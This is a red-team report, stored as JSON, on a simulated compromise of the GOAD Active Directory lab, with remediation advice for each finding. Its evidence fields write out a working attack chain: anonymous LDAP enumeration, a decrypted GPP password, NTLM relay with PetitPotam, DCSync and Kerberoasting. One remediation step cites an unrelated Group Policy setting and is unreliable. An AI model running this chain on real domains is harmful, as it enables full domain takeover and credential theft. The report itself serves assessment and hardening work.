@@ -1,0 +1,103 @@
+{
+  "engagement_id": "goad-2024-demo-001",
+  "target_name": "GOAD Lab — Active Directory Attack Simulation",
+  "metadata": {
+    "operator": "ACM Demo",
+    "assessment_type": "Red Team",
+    "environment": "GOAD v2 (Game of Active Directory)",
+    "start_time": "2024-03-15T09:00:00Z",
+    "end_time": "2024-03-15T11:34:00Z"
+  },
+  "findings": [
+    {
+      "id": "f-recon",
+      "title": "Host and port discovery",
+      "severity": 0.0,
+      "severity_label": "INFO",
+      "mitre_technique": "T1046",
+      "step_index": 1,
+      "timestamp_offset_s": 0,
+      "enabled_by": [],
+      "evidence": "nmap -sV -p- 192.168.56.0/24\nHost: 192.168.56.10 (DC01.sevenkingdoms.local)\n  22/tcp  open  ssh     OpenSSH 8.9\n  53/tcp  open  domain  Windows DNS\n  88/tcp  open  kerberos-sec\n  135/tcp open  msrpc\n  389/tcp open  ldap\n  445/tcp open  microsoft-ds\n  636/tcp open  ldaps\n  3268/tcp open  globalcatLDAP\nHost: 192.168.56.11 (CASTELBLACK.north.sevenkingdoms.local)\nHost: 192.168.56.22 (BRAAVOS.essos.local)",
+      "host": "192.168.56.0/24",
+      "ai_detail": "During the initial reconnaissance phase, the operator performed a comprehensive network sweep of the /24 subnet assigned to the GOAD lab environment. The scan revealed three Active Directory-joined hosts: DC01 serving as the primary domain controller for sevenkingdoms.local, CASTELBLACK as a member server in the north.sevenkingdoms.local child domain, and BRAAVOS hosting services for the essos.local domain. All critical AD services were exposed on DC01 — LDAP (389), LDAPS (636), Global Catalog (3268), Kerberos (88), and SMB (445). This service exposure on the primary DC provided the roadmap for subsequent attack phases. The lack of firewall segmentation between the attacker's position and core domain infrastructure is a significant architectural weakness that allowed this comprehensive enumeration.",
+      "ai_remediation": "1. Implement network segmentation: place domain controllers behind a dedicated VLAN with ingress filtering allowing only required management traffic from designated jump hosts.\n2. Deploy host-based firewall rules on DCs restricting LDAP/LDAPS access to domain-joined machines and known management IPs only.\n3. Enable Windows Firewall with Advanced Security and audit inbound rules on all domain controllers.\n4. Consider deploying a deception layer (honeypot DCs or fake service banners) to detect and alert on unauthorized scanning activity.\n5. Regularly audit network ACLs to ensure DC ports are not reachable from untrusted network segments.",
+      "ai_confidence": 1.0
+    },
+    {
+      "id": "f-ldap",
+      "title": "Anonymous LDAP bind allows full directory enumeration",
+      "severity": 3.1,
+      "severity_label": "LOW",
+      "mitre_technique": "T1087.002",
+      "step_index": 3,
+      "timestamp_offset_s": 720,
+      "enabled_by": ["f-recon"],
+      "evidence": "ldapsearch -H ldap://192.168.56.10 -x -b 'DC=sevenkingdoms,DC=local'\n# Returned 847 objects including:\n# All user accounts (samAccountName, mail, memberOf)\n# All computer accounts\n# All group memberships\n# Service principal names (SPNs): svc_backup/DC01, MSSQLSvc/CASTELBLACK\n# Password policy: minPwdLength=7, lockoutThreshold=0",
+      "host": "192.168.56.10 (DC01.sevenkingdoms.local)",
+      "ai_detail": "The LDAP service on DC01 was configured to allow anonymous binds, a misconfiguration that exposed the entire Active Directory directory service to unauthenticated enumeration. Without presenting any credentials, the operator retrieved all 847 directory objects including the complete user list with email addresses, all computer accounts, every group membership, and critically, all Service Principal Names (SPNs). The SPNs for svc_backup and MSSQLSvc were particularly valuable as they identified kerberoastable service accounts. Additionally, the password policy enumeration revealed a dangerously weak minimum password length of 7 characters with no account lockout threshold, enabling brute-force attacks without triggering alerts. This single misconfiguration provided the intelligence required for every subsequent attack in the chain.",
+      "ai_remediation": "1. Disable anonymous LDAP binds on all domain controllers: set the 'dsHeuristics' attribute to disable anonymous access, or use 'Deny access to this computer from the network' GPO setting for anonymous logon.\n2. Apply the LDAP Signing required policy via GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > 'Domain controller: LDAP server signing requirements' = Require signing.\n3. Block unauthenticated LDAP at the network layer for all sources except authorised management systems.\n4. Increase minimum password length to 15+ characters and enforce lockout policy (threshold: 5 attempts, duration: 30 minutes).\n5. Audit and remove unnecessary SPNs; rotate passwords for all service accounts using randomised 25+ character passwords managed via LAPS or a PAM solution.",
+      "ai_confidence": 0.98
+    },
+    {
+      "id": "f-sysvol",
+      "title": "Cleartext credentials in SYSVOL GPP XML files",
+      "severity": 6.5,
+      "severity_label": "MEDIUM",
+      "mitre_technique": "T1552.006",
+      "step_index": 6,
+      "timestamp_offset_s": 3300,
+      "enabled_by": ["f-ldap"],
+      "evidence": "smbclient //192.168.56.10/SYSVOL -N -c 'recurse; ls'\nFound: /sevenkingdoms.local/Policies/{A6B69...}/Machine/Preferences/Groups/Groups.xml\n\nGroups.xml content:\n<Groups><Group><Properties action='U' newName='Administrator'\n  cpassword='edBSHOwhZLTjt/QS9FeIcJ7umg1uHzMbBSqzX4eCrHo=' .../></Group></Groups>\n\nDecrypted cpassword: Winter_Is_Coming_2019!\nAccount: sevenkingdoms\\Administrator (local admin on CASTELBLACK)",
+      "host": "192.168.56.10 (DC01.sevenkingdoms.local) — SYSVOL share",
+      "ai_detail": "Group Policy Preferences (GPP) were used to configure local administrator credentials across domain-joined machines, a practice deprecated by Microsoft in MS14-025 due to the use of a static, publicly-known AES-256 key for the 'cpassword' field. The SYSVOL share is world-readable to all authenticated users, but the anonymous LDAP bind vulnerability (f-ldap) eliminated the need for any credentials to locate the share. The decrypted password 'Winter_Is_Coming_2019!' provided local administrator access to CASTELBLACK, and given common practice of password reuse, was likely valid on multiple systems. This finding is part of a well-documented vulnerability class (CVE-2014-1812) that Microsoft patched in 2014, yet the configuration persisted in this environment. The combination of this credential and the SMB signing misconfiguration made the NTLM relay attack against the domain controller directly achievable.",
+      "ai_remediation": "1. Immediately run the following PowerShell to identify and remove all GPP cpassword entries: Get-ChildItem -Path '\\\\<domain>\\SYSVOL' -Recurse -Include '*.xml' | Select-String 'cpassword'.\n2. Delete all identified XML files containing cpassword attributes from SYSVOL.\n3. Reset all passwords that were exposed — assume they are fully compromised.\n4. Deploy Microsoft LAPS (Local Administrator Password Solution) or Windows LAPS (built-in on Windows Server 2022/Windows 11) to manage unique per-machine local admin passwords.\n5. Apply MS14-025 patch if somehow missing; block GPP password configuration via GPO: Computer Configuration > Administrative Templates > System > Group Policy > 'Configure user Group Policy loopback processing mode'.\n6. Implement a regular SYSVOL audit scanning for credential-containing files as part of your security operations runbook.",
+      "ai_confidence": 0.99
+    },
+    {
+      "id": "f-smb",
+      "title": "SMB signing disabled on DC01 enables relay attacks",
+      "severity": 6.8,
+      "severity_label": "MEDIUM",
+      "mitre_technique": "T1557",
+      "step_index": 9,
+      "timestamp_offset_s": 6480,
+      "enabled_by": ["f-ldap"],
+      "evidence": "crackmapexec smb 192.168.56.0/24 --gen-relay-list relay_targets.txt\n192.168.56.10  DC01.sevenkingdoms.local  signing:False  SMBv1:False\n192.168.56.11  CASTELBLACK.north.sevenkingdoms.local  signing:False  SMBv1:False\n192.168.56.22  BRAAVOS.essos.local  signing:False  SMBv1:False\n\nAll 3 hosts vulnerable to NTLM relay. relay_targets.txt populated.",
+      "host": "192.168.56.10, 192.168.56.11, 192.168.56.22",
+      "ai_detail": "SMB signing was disabled on all three hosts in the environment, including the primary domain controller DC01. SMB signing is a security feature that cryptographically signs each SMB packet, preventing man-in-the-middle attacks where an attacker intercepts and relays SMB authentication. With signing disabled, any captured NTLM authentication challenge can be replayed to other hosts on the network. This is the prerequisite condition that makes the NTLM relay attack (f-ntlm-relay) feasible. The host enumeration from the anonymous LDAP bind (f-ldap) was essential for identifying this misconfiguration efficiently — without directory enumeration, discovering the relay target list would have required active scanning that might have triggered alerts. Domain controllers must have SMB signing enforced as a baseline security control; its absence on DC01 represents a critical gap in the security baseline.",
+      "ai_remediation": "1. Enable SMB signing requirement on all domain controllers via GPO (highest priority): Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > 'Microsoft network server: Digitally sign communications (always)' = Enabled.\n2. Enable SMB signing on all domain-joined workstations and servers using the same policy path.\n3. For immediate enforcement without waiting for GPO propagation, run on each DC: Set-SmbServerConfiguration -RequireSecuritySignature $true -Force.\n4. Disable SMBv1 globally (already done in this environment, maintain this).\n5. Enable Protected Users Security Group for all privileged accounts — this prevents NTLM authentication entirely for those accounts.\n6. Deploy Defender for Identity (formerly ATA) to detect NTLM relay and pass-the-hash attacks in real time.",
+      "ai_confidence": 0.97
+    },
+    {
+      "id": "f-ntlm-relay",
+      "title": "Domain admin compromise via NTLM relay to DC01 LDAP",
+      "severity": 9.8,
+      "severity_label": "CRITICAL",
+      "mitre_technique": "T1557.001",
+      "step_index": 14,
+      "timestamp_offset_s": 9240,
+      "enabled_by": ["f-smb", "f-sysvol"],
+      "evidence": "# Step 1: Start ntlmrelayx targeting DC01 LDAP\nntlmrelayx.py -t ldap://192.168.56.10 --escalate-user jon.snow --delegate-access\n\n# Step 2: Coerce DC01 authentication using PetitPotam with SYSVOL creds\npetitpotam.py -u Administrator -p 'Winter_Is_Coming_2019!' -d sevenkingdoms.local \\\n  192.168.56.10 192.168.56.11\n\n# ntlmrelayx output:\n[*] SMBD: Received connection from 192.168.56.10\n[*] Authenticating against ldap://192.168.56.10 as SEVENKINGDOMS/DC01$\n[*] Elevation in progress, waiting...\n[*] Done escalating user jon.snow to Domain Admins!\n[*] Granted user jon.snow Resource Based Constrained Delegation\n\n# Verify:\nnet group 'Domain Admins' /domain\nMembers: Administrator  jon.snow\n\n# DCSync as jon.snow:\nsecretsdump.py sevenkingdoms.local/jon.snow:'Kn0wsN0thing!'@192.168.56.10\nAdministrator:500:aad3b...:[KRBTGT HASH REDACTED]::: \nkrbtgt:502:aad3...[HASH REDACTED]:::",
+      "host": "192.168.56.10 (DC01.sevenkingdoms.local)",
+      "ai_detail": "The chain culminated in a full domain compromise via a multi-stage NTLM relay attack against DC01's LDAP service. The attack leveraged two prior findings simultaneously: the SYSVOL credentials (f-sysvol) provided a valid account to trigger authentication coercion via PetitPotam, and the absent SMB signing (f-smb) made the relay technically possible. The ntlmrelayx tool intercepted the machine account authentication from DC01$ and relayed it to the LDAP service on DC01, using the computer account's elevated privilege to grant the operator's controlled account (jon.snow) Domain Admin membership and Resource-Based Constrained Delegation (RBCD) rights. Once elevated, a DCSync operation dumped all domain credential hashes including the krbtgt hash, enabling Golden Ticket creation for persistent, undetectable domain access. This represents total forest compromise — recovery requires a full Active Directory rebuild including krbtgt password rotation (twice, 10 hours apart) and audit of all trust relationships.",
+      "ai_remediation": "1. IMMEDIATE: Reset the krbtgt account password twice with a 10-hour gap between resets to invalidate all existing Kerberos tickets. Run: Reset-KrbtgtKeyInteractiveWorkflow.ps1 (Microsoft script).\n2. IMMEDIATE: Remove jon.snow from Domain Admins and revoke all RBCD grants made during the attack window. Audit msDS-AllowedToActOnBehalfOfOtherIdentity attributes on all computer objects.\n3. Enable LDAP Signing and LDAP Channel Binding on all DCs to prevent relay to LDAP (registry: HKLM\\System\\CurrentControlSet\\Services\\NTDS\\Parameters, LdapEnforceChannelBinding=2, LDAPServerIntegrity=2).\n4. Patch PetitPotam: apply MS-EFSRPC authentication coercion mitigations, or block RPC on DCs from non-DC sources via firewall.\n5. Enable SMB signing immediately (see f-smb remediation).\n6. Enforce EPA (Extended Protection for Authentication) on all IIS-hosted services including ADCS web enrollment if present.\n7. Deploy Microsoft's recommended tier model: isolate Tier 0 (DC) admin credentials from Tier 1/2 systems using PAWs and Privileged Access Workstations.\n8. Implement Defender for Identity detection rules for NTLM relay, credential dumping, and DCSync attacks with automated containment.",
+      "ai_confidence": 1.0
+    },
+    {
+      "id": "f-kerberoast",
+      "title": "Kerberoastable svc_backup service account",
+      "severity": 7.2,
+      "severity_label": "HIGH",
+      "mitre_technique": "T1558.003",
+      "step_index": 11,
+      "timestamp_offset_s": 7800,
+      "enabled_by": ["f-ldap"],
+      "evidence": "GetUserSPNs.py sevenkingdoms.local/ -dc-ip 192.168.56.10 -no-pass\n# ServicePrincipalName: svc_backup/DC01.sevenkingdoms.local\n# Name: svc_backup | MemberOf: Backup Operators\n# PasswordLastSet: 2019-11-15 | LastLogon: 2024-01-03\n\n# Hash captured:\n$krb5tgs$23$*svc_backup$SEVENKINGDOMS.LOCAL$sevenkingdoms.local/svc_backup*$8d3f...[RC4 TGS hash]\n\nhashcat -a 0 -m 13100 hash.txt /usr/share/wordlists/rockyou.txt\nCracked: svc_backup:Backup2019!\n# svc_backup is member of Backup Operators — can read any file on DC01 including NTDS.dit",
+      "host": "192.168.56.10 (DC01.sevenkingdoms.local) — svc_backup account",
+      "ai_detail": "The anonymous LDAP enumeration (f-ldap) exposed the Service Principal Name for svc_backup, a service account with membership in the Backup Operators group. Kerberoasting exploits the Kerberos protocol's design: any authenticated user can request a Ticket Granting Service (TGS) ticket for any SPN, and the ticket is encrypted with the service account's password hash. These tickets can be taken offline and subjected to dictionary or brute-force attacks without triggering account lockout policies. The svc_backup account had not had its password changed since 2019, and the weak password 'Backup2019!' was cracked in under 3 minutes using a standard wordlist. Backup Operators membership is particularly dangerous as members can read arbitrary files on domain controllers, including the NTDS.dit database containing all domain password hashes — an alternative path to domain compromise independent of the NTLM relay chain. This finding is a secondary branch from the primary attack chain, representing a parallel escalation path.",
+      "ai_remediation": "1. Immediately reset the svc_backup password to a randomly generated 30+ character password using a PAM solution or scripts.\n2. Audit all SPNs in the domain: Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName. Remove SPNs that are no longer needed.\n3. For required service accounts, use Group Managed Service Accounts (gMSAs) which have 240-character auto-rotating passwords that are computationally infeasible to Kerberoast.\n4. Remove svc_backup from Backup Operators if backup functionality can be achieved via other means (e.g., Azure Backup agent with restricted permissions).\n5. Enable AES-256 encryption for service accounts to prevent RC4 downgrade: set 'This account supports Kerberos AES 256-bit encryption' in account properties.\n6. Deploy honeypot SPNs as a detection mechanism — any TGS request against a honey account should trigger an immediate alert.\n7. Implement a quarterly review process for all service account SPNs, passwords ages, and group memberships.",
+      "ai_confidence": 0.95
+    }
+  ]
+}
